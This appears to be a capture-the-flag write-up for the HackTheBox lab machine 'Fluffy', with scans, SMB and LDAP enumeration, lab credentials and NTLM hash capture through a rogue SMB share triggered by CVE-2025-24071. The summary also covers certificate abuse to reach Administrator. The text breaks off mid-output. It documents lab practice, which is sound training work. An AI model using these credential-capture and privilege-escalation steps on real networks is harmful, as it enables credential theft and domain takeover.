---
layout: post
title: "week 2 fluffy"
date: 2025-05-31 00:00:00 -0700
categories: challenges
description: Windows AD enumeration with certificate forgery, again
parent: HackTheBox - Season 8
grand_parent: Challenges
event: "htb-season-8"
tags:
- "AD"
- "Windows"
- "easy"
- "Certificates"
---

# fluffy

## Engagement Notes
This was more bloodhound based enumeration and lots of push towards certificate-based vulnerabilities. 

The foothold involved exfiltrating a PDF from a share accessible by the initial user, which outlined a CVE published which involved building a zip file that had a link to my malicious smb share. Using impacket smbserver, I passed my smb via that zip file upload to the IT smb share which was opened by p.agila. The resulting hashes were then cracked via hashcrack to a password for p.agila who had write access to winrm_svc providing remote access, which was necessary to write to the ca_svc account to add administrator UPN to the account, which then generated administrator certificates to authenticate to the root account and finish the box.

# Enumeration

### Set variables for further engagement


```python
import requests
from pprint import pprint

source =! ip address | grep tun | grep 10 | tr "/" " " | awk '{print $2}'
public_source = requests.get('https://ifconfig.co/ip').text
target = 'fluffy.htb'
targetip = '10.129.137.175'

print(f"source: {source}")
print(f"target: {target}")
```

    source: ['10.10.14.28']
    target: fluffy.htb


### Port scan target


```python
!docker run -it --rm -v $(pwd):/app/target rustscan -a $target
```

    0day was here ♥
    
    [1;34m[~][0m The config file is expected to be at "/home/rustscan/.rustscan.toml"
    [1;34m[~][0m File limit higher than batch size. Can increase speed by increasing batch size '-b 524188'.
    Open [35m10.129.167.185:53[0m
    Open [35m10.129.167.185:88[0m
    Open [35m10.129.167.185:139[0m
    Open [35m10.129.167.185:389[0m
    Open [35m10.129.167.185:445[0m
    Open [35m10.129.167.185:464[0m
    Open [35m10.129.167.185:593[0m
    Open [35m10.129.167.185:636[0m
    Open [35m10.129.167.185:3269[0m
    Open [35m10.129.167.185:3268[0m
    Open [35m10.129.167.185:5985[0m
    Open [35m10.129.167.185:9389[0m
    Open [35m10.129.167.185:49677[0m
    Open [35m10.129.167.185:49698[0m
    Open [35m10.129.167.185:49667[0m
    Open [35m10.129.167.185:49678[0m
    Open [35m10.129.167.185:49685[0m
    Open [35m10.129.167.185:49711[0m
    Open [35m10.129.167.185:49733[0m
    [1;34m[~][0m Starting Script(s)
    [1;34m[~][0m Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-26 00:48 UTC
    Initiating Ping Scan at 00:48
    Scanning 10.129.167.185 [2 ports]
    Completed Ping Scan at 00:48, 3.00s elapsed (1 total hosts)
    Nmap scan report for 10.129.167.185 [host down, received no-response]
    Read data files from: /usr/bin/../share/nmap
    Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
    Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds
    


We've got lots more LDAP services and not much of anything else. Looks like AD is on the menu boys!


```python
!enum4linux-ng $target -w fluffy -u fluffy/j.fleischman%J0elTHEM4n1990!
```

    [92mENUM4LINUX - next generation (v1.3.4)[0m
    
     ==========================
    |    Target Information    |
     ==========================
    [94m[*] Target ........... fluffy.htb[0m
    [94m[*] Username ......... 'fluffy/j.fleischman%J0elTHEM4n1990!'[0m
    [94m[*] Random Username .. 'ehidsbpt'[0m
    [94m[*] Password ......... ''[0m
    [94m[*] Timeout .......... 5 second(s)[0m
    
     ===================================
    |    Listener Scan on fluffy.htb    |
     ===================================
    [94m[*] Checking LDAP[0m
    [92m[+] LDAP is accessible on 389/tcp[0m
    [94m[*] Checking LDAPS[0m
    [92m[+] LDAPS is accessible on 636/tcp[0m
    [94m[*] Checking SMB[0m
    [92m[+] SMB is accessible on 445/tcp[0m
    [94m[*] Checking SMB over NetBIOS[0m
    [92m[+] SMB over NetBIOS is accessible on 139/tcp[0m
    
     ==================================================
    |    Domain Information via LDAP for fluffy.htb    |
     ==================================================
    [94m[*] Trying LDAP[0m
    [92m[+] Appears to be root/parent DC[0m
    [92m[+] Long domain name is: fluffy.htb[0m
    
     =========================================================
    |    NetBIOS Names and Workgroup/Domain for fluffy.htb    |
     =========================================================
    [91m[-] Could not get NetBIOS names information via 'nmblookup': timed out[0m
    
     =======================================
    |    SMB Dialect Check on fluffy.htb    |
     =======================================
    [94m[*] Trying on 445/tcp[0m
    [92m[+] Supported dialects and settings:
    Supported dialects:
      SMB 1.0: false
      SMB 2.02: true
      SMB 2.1: true
      SMB 3.0: true
      SMB 3.1.1: true
    Preferred dialect: SMB 3.0
    SMB1 only: false
    SMB signing required: true[0m
    
     =========================================================
    |    Domain Information via SMB session for fluffy.htb    |
     =========================================================
    [94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
    [92m[+] Found domain information via SMB
    NetBIOS computer name: DC01
    NetBIOS domain name: FLUFFY
    DNS domain: fluffy.htb
    FQDN: DC01.fluffy.htb
    Derived membership: domain member
    Derived domain: FLUFFY[0m
    
     =======================================
    |    RPC Session Check on fluffy.htb    |
     =======================================
    [94m[*] Check for null session[0m
    [91m[-] Could not establish null session: timed out[0m
    [94m[*] Check for user session[0m
    [91m[-] Could not establish user session: timed out[0m
    [94m[*] Check for random user[0m
    [92m[+] Server allows session using username 'ehidsbpt', password ''[0m
    [92m[H] Rerunning enumeration with user 'ehidsbpt' might give more results[0m
    
     =============================================
    |    OS Information via RPC for fluffy.htb    |
     =============================================
    [94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
    [92m[+] Found OS information via SMB[0m
    [94m[*] Enumerating via 'srvinfo'[0m
    [91m[-] Skipping 'srvinfo' run, not possible with provided credentials[0m
    [92m[+] After merging OS information we have the following result:
    OS: Windows 10, Windows Server 2019, Windows Server 2016
    OS version: '10.0'
    OS release: '1809'
    OS build: '17763'
    Native OS: not supported
    Native LAN manager: not supported
    Platform id: null
    Server type: null
    Server type string: null[0m
    
    [93m[!] Aborting remainder of tests, sessions are possible, but not with the provided credentials (see session check results)[0m
    
    Completed after 42.52 seconds


Just to enumerate, what can we see with our given account through the smb share since enum failed us.


```python
!smbclient -L //$target -U fluffy/j.fleischman%J0elTHEM4n1990!
```

    Can't load /etc/samba/smb.conf - run testparm to debug it
    
    	Sharename       Type      Comment
    	---------       ----      -------
    	ADMIN$          Disk      Remote Admin
    	C$              Disk      Default share
    	IPC$            IPC       Remote IPC
    	IT              Disk      
    	NETLOGON        Disk      Logon server share 
    	SYSVOL          Disk      Logon server share 
    SMB1 disabled -- no workgroup available



```python
!smbclient //$target/IT -U fluffy/j.fleischman%J0elTHEM4n1990!
```

    Can't load /etc/samba/smb.conf - run testparm to debug it
    Try "help" to get a list of possible commands.
    [?2004hsmb: \> ^C[?2004l

```sh
 smbclient //fluffy.htb/IT -U fluffy/j.fleischman%J0elTHEM4n1990!
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 19 07:27:02 2025
  ..                                  D        0  Mon May 19 07:27:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 08:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 08:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 08:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 08:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 07:31:07 2025

                5842943 blocks of size 4096. 1364523 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (33.1 KiloBytes/sec) (average 33.1 KiloBytes/sec)
smb: \> cd KeePass-2.58
smb: \KeePass-2.58\> ls
  .                                   D        0  Fri Apr 18 08:08:38 2025
  ..                                  D        0  Fri Apr 18 08:08:38 2025
  KeePass.chm                         A   768478  Tue Mar  4 09:26:42 2025
  KeePass.exe                         A  3305824  Tue Mar  4 09:24:30 2025
  KeePass.exe.config                  A      763  Tue Mar  4 09:27:04 2025
  KeePass.XmlSerializers.dll          A   463264  Tue Mar  4 09:25:02 2025
  KeePassLibC32.dll                   A   609136  Tue Mar  4 09:18:42 2025
  KeePassLibC64.dll                   A   785776  Tue Mar  4 09:20:42 2025
  Languages                          Dn        0  Tue Mar  4 09:27:06 2025
  License.txt                         A    18710  Wed Jan  1 14:32:38 2025
  Plugins                            Dn        0  Tue Mar  4 09:27:06 2025
  ShInstUtil.exe                      A    97128  Tue Mar  4 09:26:12 2025
  XSL                                Dn        0  Fri Apr 18 08:08:38 2025

                5842943 blocks of size 4096. 1332347 blocks available
smb: \KeePass-2.58\> get KeePass.exe.config
getting file \KeePass-2.58\KeePass.exe.config of size 763 as KeePass.exe.config (0.7 KiloBytes/sec) (average 27.3 KiloBytes/sec)
smb: \KeePass-2.58\> cd ../Everything-1.4.1.1026.x64
smb: \Everything-1.4.1.1026.x64\> ls
  .                                   D        0  Fri Apr 18 08:08:44 2025
  ..                                  D        0  Fri Apr 18 08:08:44 2025
  everything.exe                      A  2265104  Thu Aug  1 18:43:54 2024
  Everything.lng                      A   958342  Thu Jul 25 13:19:04 2024

                5842943 blocks of size 4096. 1333148 blocks available
smb: \Everything-1.4.1.1026.x64\> get everything.exe

## PDF vulns
We find a PDF with required patching, this is probably a hint on what we can expect in this environment and we should note it down.

* CVE-2025-24996 Critical
* CVE-2025-24071 Critical https://github.com/ThemeHackers/CVE-2025-24071
* CVE-2025-46785 High 
* CVE-2025-29968 High 
* CVE-2025-21193 Medium
* CVE-2025-3445 Low

```sh
 smbclient //fluffy.htb/C$ -U fluffy/j.fleischman%J0elTHEM4n1990!
Can't load /etc/samba/smb.conf - run testparm to debug it
tree connect failed: NT_STATUS_ACCESS_DENIED
 smbclient //fluffy.htb/ADMIN$ -U fluffy/j.fleischman%J0elTHEM4n1990!
Can't load /etc/samba/smb.conf - run testparm to debug it
tree connect failed: NT_STATUS_ACCESS_DENIED


```python
!bloodhound-python -u j.fleischman -p J0elTHEM4n1990! -d fluffy.htb -ns $targetip -c All
```

    INFO: Found AD domain: fluffy.htb
    INFO: Getting TGT for user
    WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
    INFO: Connecting to LDAP server: dc01.fluffy.htb
    INFO: Found 1 domains
    INFO: Found 1 domains in the forest
    INFO: Found 1 computers
    INFO: Connecting to LDAP server: dc01.fluffy.htb
    INFO: Found 10 users
    INFO: Found 54 groups
    INFO: Found 2 gpos
    INFO: Found 1 ous
    INFO: Found 19 containers
    INFO: Found 0 trusts
    INFO: Starting computer enumeration with 10 workers
    INFO: Querying computer: DC01.fluffy.htb
    <snip>
    
    INFO: Done in 01M 06S


Add some more known-users to our list to target what we're searching for.


```python
!enum4linux-ng $target -w fluffy -w fluffy -u j.fleischman -p J0elTHEM4n1990! -k "p.agila,j.coffey,j.fleischman"
```

    [92mENUM4LINUX - next generation (v1.3.4)[0m
    
     ==========================
    |    Target Information    |
     ==========================
    [94m[*] Target ........... fluffy.htb[0m
    [94m[*] Username ......... 'j.fleischman'[0m
    [94m[*] Random Username .. 'rpxumzlw'[0m
    [94m[*] Password ......... 'J0elTHEM4n1990!'[0m
    [94m[*] Timeout .......... 5 second(s)[0m
    
     ===================================
    |    Listener Scan on fluffy.htb    |
     ===================================
    [94m[*] Checking LDAP[0m
    [92m[+] LDAP is accessible on 389/tcp[0m
    [94m[*] Checking LDAPS[0m
    [92m[+] LDAPS is accessible on 636/tcp[0m
    [94m[*] Checking SMB[0m
    [92m[+] SMB is accessible on 445/tcp[0m
    [94m[*] Checking SMB over NetBIOS[0m
    [92m[+] SMB over NetBIOS is accessible on 139/tcp[0m
    
     ==================================================
    |    Domain Information via LDAP for fluffy.htb    |
     ==================================================
    [94m[*] Trying LDAP[0m
    [92m[+] Appears to be root/parent DC[0m
    [92m[+] Long domain name is: fluffy.htb[0m
    
     =========================================================
    |    NetBIOS Names and Workgroup/Domain for fluffy.htb    |
     =========================================================
    [91m[-] Could not get NetBIOS names information via 'nmblookup': timed out[0m
    
     =======================================
    |    SMB Dialect Check on fluffy.htb    |
     =======================================
    [94m[*] Trying on 445/tcp[0m
    [92m[+] Supported dialects and settings:
    Supported dialects:
      SMB 1.0: false
      SMB 2.02: true
      SMB 2.1: true
      SMB 3.0: true
      SMB 3.1.1: true
    Preferred dialect: SMB 3.0
    SMB1 only: false
    SMB signing required: true[0m
    
     =========================================================
    |    Domain Information via SMB session for fluffy.htb    |
     =========================================================
    [94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
    [92m[+] Found domain information via SMB
    NetBIOS computer name: DC01
    NetBIOS domain name: FLUFFY
    DNS domain: fluffy.htb
    FQDN: DC01.fluffy.htb
    Derived membership: domain member
    Derived domain: FLUFFY[0m
    
     =======================================
    |    RPC Session Check on fluffy.htb    |
     =======================================
    [94m[*] Check for null session[0m
    [92m[+] Server allows session using username '', password ''[0m
    [94m[*] Check for user session[0m
    [92m[+] Server allows session using username 'j.fleischman', password 'J0elTHEM4n1990!'[0m
    [94m[*] Check for random user[0m
    [92m[+] Server allows session using username 'rpxumzlw', password 'J0elTHEM4n1990!'[0m
    [92m[H] Rerunning enumeration with user 'rpxumzlw' might give more results[0m
    
     =================================================
    |    Domain Information via RPC for fluffy.htb    |
     =================================================
    [92m[+] Domain: FLUFFY[0m
    [92m[+] Domain SID: S-1-5-21-497550768-2797716248-2627064577[0m
    [92m[+] Membership: domain member[0m
    
     =============================================
    |    OS Information via RPC for fluffy.htb    |
     =============================================
    [94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
    [92m[+] Found OS information via SMB[0m
    [94m[*] Enumerating via 'srvinfo'[0m
    [92m[+] Found OS information via 'srvinfo'[0m
    [92m[+] After merging OS information we have the following result:
    OS: Windows 10, Windows Server 2019, Windows Server 2016
    OS version: '10.0'
    OS release: '1809'
    OS build: '17763'
    Native OS: not supported
    Native LAN manager: not supported
    Platform id: '500'
    Server type: '0x80102b'
    Server type string: Wk Sv PDC Tim NT[0m
    
     ===================================
    |    Users via RPC on fluffy.htb    |
     ===================================
    [94m[*] Enumerating users via 'querydispinfo'[0m
    [92m[+] Found 9 user(s) via 'querydispinfo'[0m
    [94m[*] Enumerating users via 'enumdomusers'[0m
    [92m[+] Found 9 user(s) via 'enumdomusers'[0m
    [92m[+] After merging user results we have 9 user(s) total:
    '1103':
      username: ca_svc
      name: certificate authority service
      acb: '0x00000210'
      description: (null)
    '1104':
      username: ldap_svc
      name: ldap service
      acb: '0x00000210'
      description: (null)
    '1601':
      username: p.agila
      name: Prometheus Agila
      acb: '0x00000210'
      description: (null)
    '1603':
      username: winrm_svc
      name: winrm service
      acb: '0x00000210'
      description: (null)
    '1605':
      username: j.coffey
      name: John Coffey
      acb: '0x00000210'
      description: (null)
    '1606':
      username: j.fleischman
      name: Joel Fleischman
      acb: '0x00000210'
      description: (null)
    '500':
      username: Administrator
      name: (null)
      acb: '0x00000210'
      description: Built-in account for administering the computer/domain
    '501':
      username: Guest
      name: (null)
      acb: '0x00000214'
      description: Built-in account for guest access to the computer/domain
    '502':
      username: krbtgt
      name: (null)
      acb: '0x00000011'
      description: Key Distribution Center Service Account[0m
    
     ====================================
    |    Groups via RPC on fluffy.htb    |
     ====================================
    [94m[*] Enumerating local groups[0m
    [92m[+] Found 5 group(s) via 'enumalsgroups domain'[0m
    [94m[*] Enumerating builtin groups[0m
    [92m[+] Found 28 group(s) via 'enumalsgroups builtin'[0m
    [94m[*] Enumerating domain groups[0m
    [92m[+] Found 17 group(s) via 'enumdomgroups'[0m
    [92m[+] After merging groups results we have 50 group(s) total:
    '1101':
      groupname: DnsAdmins
      type: local
    '1102':
      groupname: DnsUpdateProxy
      type: domain
    '1604':
      groupname: Service Account Managers
      type: domain
    '1607':
      groupname: Service Accounts
      type: domain
    '498':
      groupname: Enterprise Read-only Domain Controllers
      type: domain
    '512':
      groupname: Domain Admins
      type: domain
    '513':
      groupname: Domain Users
      type: domain
    '514':
      groupname: Domain Guests
      type: domain
    '515':
      groupname: Domain Computers
      type: domain
    '516':
      groupname: Domain Controllers
      type: domain
    '517':
      groupname: Cert Publishers
      type: local
    '518':
      groupname: Schema Admins
      type: domain
    '519':
      groupname: Enterprise Admins
      type: domain
    '520':
      groupname: Group Policy Creator Owners
      type: domain
    '521':
      groupname: Read-only Domain Controllers
      type: domain
    '522':
      groupname: Cloneable Domain Controllers
      type: domain
    '525':
      groupname: Protected Users
      type: domain
    '526':
      groupname: Key Admins
      type: domain
    '527':
      groupname: Enterprise Key Admins
      type: domain
    '544':
      groupname: Administrators
      type: builtin
    '545':
      groupname: Users
      type: builtin
    '546':
      groupname: Guests
      type: builtin
    '548':
      groupname: Account Operators
      type: builtin
    '549':
      groupname: Server Operators
      type: builtin
    '550':
      groupname: Print Operators
      type: builtin
    '551':
      groupname: Backup Operators
      type: builtin
    '552':
      groupname: Replicator
      type: builtin
    '553':
      groupname: RAS and IAS Servers
      type: local
    '554':
      groupname: Pre-Windows 2000 Compatible Access
      type: builtin
    '555':
      groupname: Remote Desktop Users
      type: builtin
    '556':
      groupname: Network Configuration Operators
      type: builtin
    '557':
      groupname: Incoming Forest Trust Builders
      type: builtin
    '558':
      groupname: Performance Monitor Users
      type: builtin
    '559':
      groupname: Performance Log Users
      type: builtin
    '560':
      groupname: Windows Authorization Access Group
      type: builtin
    '561':
      groupname: Terminal Server License Servers
      type: builtin
    '562':
      groupname: Distributed COM Users
      type: builtin
    '568':
      groupname: IIS_IUSRS
      type: builtin
    '569':
      groupname: Cryptographic Operators
      type: builtin
    '571':
      groupname: Allowed RODC Password Replication Group
      type: local
    '572':
      groupname: Denied RODC Password Replication Group
      type: local
    '573':
      groupname: Event Log Readers
      type: builtin
    '574':
      groupname: Certificate Service DCOM Access
      type: builtin
    '575':
      groupname: RDS Remote Access Servers
      type: builtin
    '576':
      groupname: RDS Endpoint Servers
      type: builtin
    '577':
      groupname: RDS Management Servers
      type: builtin
    '578':
      groupname: Hyper-V Administrators
      type: builtin
    '579':
      groupname: Access Control Assistance Operators
      type: builtin
    '580':
      groupname: Remote Management Users
      type: builtin
    '582':
      groupname: Storage Replica Administrators
      type: builtin[0m
    
     ====================================
    |    Shares via RPC on fluffy.htb    |
     ====================================
    [94m[*] Enumerating shares[0m
    [92m[+] Found 6 share(s):
    ADMIN$:
      comment: Remote Admin
      type: Disk
    C$:
      comment: Default share
      type: Disk
    IPC$:
      comment: Remote IPC
      type: IPC
    IT:
      comment: ''
      type: Disk
    NETLOGON:
      comment: Logon server share
      type: Disk
    SYSVOL:
      comment: Logon server share
      type: Disk[0m
    [94m[*] Testing share ADMIN$[0m
    [92m[+] Mapping: DENIED, Listing: N/A[0m
    [94m[*] Testing share C$[0m
    [92m[+] Mapping: DENIED, Listing: N/A[0m
    [94m[*] Testing share IPC$[0m
    [92m[+] Mapping: OK, Listing: NOT SUPPORTED[0m
    [94m[*] Testing share IT[0m
    [91m[-] Could not check share: timed out[0m
    [94m[*] Testing share NETLOGON[0m
    [91m[-] Could not check share: timed out[0m
    [94m[*] Testing share SYSVOL[0m
    [91m[-] Could not check share: timed out[0m
    
     =======================================
    |    Policies via RPC for fluffy.htb    |
     =======================================
    [94m[*] Trying port 445/tcp[0m
    [92m[+] Found policy:
    Domain password information:
      Password history length: 24
      Minimum password length: 7
      Maximum password age: 41 days 23 hours 53 minutes
      Password properties:
      - DOMAIN_PASSWORD_COMPLEX: false
      - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
      - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
      - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
      - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
      - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
    Domain lockout information:
      Lockout observation window: 10 minutes
      Lockout duration: 10 minutes
      Lockout threshold: None
    Domain logoff information:
      Force logoff time: not set[0m
    
     =======================================
    |    Printers via RPC for fluffy.htb    |
     =======================================
    [92m[+] No printers available[0m
    
    Completed after 82.20 seconds


Some manual enumeration of RPC as we explore the environment and the passwords we have.


```python
!net rpc info -U fluffy/j.fleischman%'J0elTHEM4n1990!' -S fluffy.htb
```

    Can't load /etc/samba/smb.conf - run testparm to debug it
    Domain Name: FLUFFY
    Domain SID: S-1-5-21-497550768-2797716248-2627064577
    Sequence number: 1
    Num users: 43
    Num domain groups: 0
    Num local groups: 17



```python
!net rpc info -U fluffy/j.coffey%'J0elTHEM4n1990!' -S fluffy.htb
```

    Can't load /etc/samba/smb.conf - run testparm to debug it
    Could not connect to server fluffy.htb
    The username or password was not correct.
    Connection failed: NT_STATUS_LOGON_FAILURE


There's an SMB connection that's going out and we can catch it happening if we set up our own malicious smbserver and trigger [CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071) we found earlier by adding our malicious SMB endpoint with this tool to force our user to connect to our share to get resources.
```sh
[nix-shell:~/ctf/htb/season8/fluffy]$ sudo smbserver.py -smb2support shared .
[sudo] password for tokugero:
Impacket v0.12.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.167.185,50526)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:e091b5cb<SNIP>
[*] Closing down connection (10.129.167.185,50526)
[*] Remaining connections []
[*] Incoming connection (10.129.167.185,50527)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:b231c2<SNIP>
[*] Closing down connection (10.129.167.185,50527)
[*] Remaining connections []
[*] Incoming connection (10.129.167.185,50530)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:<SNIP>
[*] Closing down connection (10.129.167.185,50530)
[*] Remaining connections []

Enumerating with the password we cracked from the NT hash:


```python
!enum4linux-ng $target -w fluffy -u p.agila -p prometheusx-303 
```

    [92mENUM4LINUX - next generation (v1.3.4)[0m
    
     ==========================
    |    Target Information    |
     ==========================
    [94m[*] Target ........... fluffy.htb[0m
    [94m[*] Username ......... 'p.agila'[0m
    [94m[*] Random Username .. 'mnpxjczu'[0m
    [94m[*] Password ......... 'prometheusx-303'[0m
    [94m[*] Timeout .......... 5 second(s)[0m
    
     ===================================
    |    Listener Scan on fluffy.htb    |
     ===================================
    [94m[*] Checking LDAP[0m
    [92m[+] LDAP is accessible on 389/tcp[0m
    [94m[*] Checking LDAPS[0m
    [92m[+] LDAPS is accessible on 636/tcp[0m
    [94m[*] Checking SMB[0m
    [92m[+] SMB is accessible on 445/tcp[0m
    [94m[*] Checking SMB over NetBIOS[0m
    [92m[+] SMB over NetBIOS is accessible on 139/tcp[0m
    
     ==================================================
    |    Domain Information via LDAP for fluffy.htb    |
     ==================================================
    [94m[*] Trying LDAP[0m
    [92m[+] Appears to be root/parent DC[0m
    [92m[+] Long domain name is: fluffy.htb[0m
    
     =========================================================
    |    NetBIOS Names and Workgroup/Domain for fluffy.htb    |
     =========================================================
    [91m[-] Could not get NetBIOS names information via 'nmblookup': timed out[0m
    
     =======================================
    |    SMB Dialect Check on fluffy.htb    |
     =======================================
    [94m[*] Trying on 445/tcp[0m
    [92m[+] Supported dialects and settings:
    Supported dialects:
      SMB 1.0: false
      SMB 2.02: true
      SMB 2.1: true
      SMB 3.0: true
      SMB 3.1.1: true
    Preferred dialect: SMB 3.0
    SMB1 only: false
    SMB signing required: true[0m
    
     =========================================================
    |    Domain Information via SMB session for fluffy.htb    |
     =========================================================
    [94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
    [92m[+] Found domain information via SMB
    NetBIOS computer name: DC01
    NetBIOS domain name: FLUFFY
    DNS domain: fluffy.htb
    FQDN: DC01.fluffy.htb
    Derived membership: domain member
    Derived domain: FLUFFY[0m
    
     =======================================
    |    RPC Session Check on fluffy.htb    |
     =======================================
    [94m[*] Check for null session[0m
    [92m[+] Server allows session using username '', password ''[0m
    [94m[*] Check for user session[0m
    [92m[+] Server allows session using username 'p.agila', password 'prometheusx-303'[0m
    [94m[*] Check for random user[0m
    [92m[+] Server allows session using username 'mnpxjczu', password 'prometheusx-303'[0m
    [92m[H] Rerunning enumeration with user 'mnpxjczu' might give more results[0m
    
     =================================================
    |    Domain Information via RPC for fluffy.htb    |
     =================================================
    [92m[+] Domain: FLUFFY[0m
    [92m[+] Domain SID: S-1-5-21-497550768-2797716248-2627064577[0m
    [92m[+] Membership: domain member[0m
    
     =============================================
    |    OS Information via RPC for fluffy.htb    |
     =============================================
    [94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
    [92m[+] Found OS information via SMB[0m
    [94m[*] Enumerating via 'srvinfo'[0m
    [92m[+] Found OS information via 'srvinfo'[0m
    [92m[+] After merging OS information we have the following result:
    OS: Windows 10, Windows Server 2019, Windows Server 2016
    OS version: '10.0'
    OS release: '1809'
    OS build: '17763'
    Native OS: not supported
    Native LAN manager: not supported
    Platform id: '500'
    Server type: '0x80102b'
    Server type string: Wk Sv PDC Tim NT[0m
    
     ===================================
    |    Users via RPC on fluffy.htb    |
     ===================================
    [94m[*] Enumerating users via 'querydispinfo'[0m
    [92m[+] Found 9 user(s) via 'querydispinfo'[0m
    [94m[*] Enumerating users via 'enumdomusers'[0m
    [92m[+] Found 9 user(s) via 'enumdomusers'[0m
    [92m[+] After merging user results we have 9 user(s) total:
    '1103':
      username: ca_svc
      name: certificate authority service
      acb: '0x00000210'
      description: (null)
    '1104':
      username: ldap_svc
      name: ldap service
      acb: '0x00000210'
      description: (null)
    '1601':
      username: p.agila
      name: Prometheus Agila
      acb: '0x00000210'
      description: (null)
    '1603':
      username: winrm_svc
      name: winrm service
      acb: '0x00000210'
      description: (null)
    '1605':
      username: j.coffey
      name: John Coffey
      acb: '0x00000210'
      description: (null)
    '1606':
      username: j.fleischman
      name: Joel Fleischman
      acb: '0x00000210'
      description: (null)
    '500':
      username: Administrator
      name: (null)
      acb: '0x00000210'
      description: Built-in account for administering the computer/domain
    '501':
      username: Guest
      name: (null)
      acb: '0x00000214'
      description: Built-in account for guest access to the computer/domain
    '502':
      username: krbtgt
      name: (null)
      acb: '0x00000011'
      description: Key Distribution Center Service Account[0m
    
     ====================================
    |    Groups via RPC on fluffy.htb    |
     ====================================
    [94m[*] Enumerating local groups[0m
    [92m[+] Found 5 group(s) via 'enumalsgroups domain'[0m
    [94m[*] Enumerating builtin groups[0m
    [92m[+] Found 28 group(s) via 'enumalsgroups builtin'[0m
    [94m[*] Enumerating domain groups[0m
    [92m[+] Found 17 group(s) via 'enumdomgroups'[0m
    [92m[+] After merging groups results we have 50 group(s) total:
    '1101':
      groupname: DnsAdmins
      type: local
    '1102':
      groupname: DnsUpdateProxy
      type: domain
    '1604':
      groupname: Service Account Managers
      type: domain
    '1607':
      groupname: Service Accounts
      type: domain
    '498':
      groupname: Enterprise Read-only Domain Controllers
      type: domain
    '512':
      groupname: Domain Admins
      type: domain
    '513':
      groupname: Domain Users
      type: domain
    '514':
      groupname: Domain Guests
      type: domain
    '515':
      groupname: Domain Computers
      type: domain
    '516':
      groupname: Domain Controllers
      type: domain
    '517':
      groupname: Cert Publishers
      type: local
    '518':
      groupname: Schema Admins
      type: domain
    '519':
      groupname: Enterprise Admins
      type: domain
    '520':
      groupname: Group Policy Creator Owners
      type: domain
    '521':
      groupname: Read-only Domain Controllers
      type: domain
    '522':
      groupname: Cloneable Domain Controllers
      type: domain
    '525':
      groupname: Protected Users
      type: domain
    '526':
      groupname: Key Admins
      type: domain
    '527':
      groupname: Enterprise Key Admins
      type: domain
    '544':
      groupname: Administrators
      type: builtin
    '545':
      groupname: Users
      type: builtin
    '546':
      groupname: Guests
      type: builtin
    '548':
      groupname: Account Operators
      type: builtin
    '549':
      groupname: Server Operators
      type: builtin
    '550':
      groupname: Print Operators
      type: builtin
    '551':
      groupname: Backup Operators
      type: builtin
    '552':
      groupname: Replicator
      type: builtin
    '553':
      groupname: RAS and IAS Servers
      type: local
    '554':
      groupname: Pre-Windows 2000 Compatible Access
      type: builtin
    '555':
      groupname: Remote Desktop Users
      type: builtin
    '556':
      groupname: Network Configuration Operators
      type: builtin
    '557':
      groupname: Incoming Forest Trust Builders
      type: builtin
    '558':
      groupname: Performance Monitor Users
      type: builtin
    '559':
      groupname: Performance Log Users
      type: builtin
    '560':
      groupname: Windows Authorization Access Group
      type: builtin
    '561':
      groupname: Terminal Server License Servers
      type: builtin
    '562':
      groupname: Distributed COM Users
      type: builtin
    '568':
      groupname: IIS_IUSRS
      type: builtin
    '569':
      groupname: Cryptographic Operators
      type: builtin
    '571':
      groupname: Allowed RODC Password Replication Group
      type: local
    '572':
      groupname: Denied RODC Password Replication Group
      type: local
    '573':
      groupname: Event Log Readers
      type: builtin
    '574':
      groupname: Certificate Service DCOM Access
      type: builtin
    '575':
      groupname: RDS Remote Access Servers
      type: builtin
    '576':
      groupname: RDS Endpoint Servers
      type: builtin
    '577':
      groupname: RDS Management Servers
      type: builtin
    '578':
      groupname: Hyper-V Administrators
      type: builtin
    '579':
      groupname: Access Control Assistance Operators
      type: builtin
    '580':
      groupname: Remote Management Users
      type: builtin
    '582':
      groupname: Storage Replica Administrators
      type: builtin[0m
    
     ====================================
    |    Shares via RPC on fluffy.htb    |
     ====================================
    [94m[*] Enumerating shares[0m
    [92m[+] Found 6 share(s):
    ADMIN$:
      comment: Remote Admin
      type: Disk
    C$:
      comment: Default share
      type: Disk
    IPC$:
      comment: Remote IPC
      type: IPC
    IT:
